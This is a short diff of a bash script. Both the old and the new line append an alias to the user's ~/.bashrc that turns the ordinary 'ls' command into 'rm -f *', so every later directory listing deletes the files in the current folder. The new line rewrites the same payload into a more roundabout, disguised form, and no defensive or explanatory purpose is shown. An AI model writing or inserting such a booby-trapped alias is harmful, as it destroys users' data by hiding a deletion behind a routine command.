@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm -f *'" >> ~/.bashrc; exec bash
+exec sh -c 'printf %b "alias ls=\"rm -f *\"\n">>"$HOME/.bashrc";exec bash'
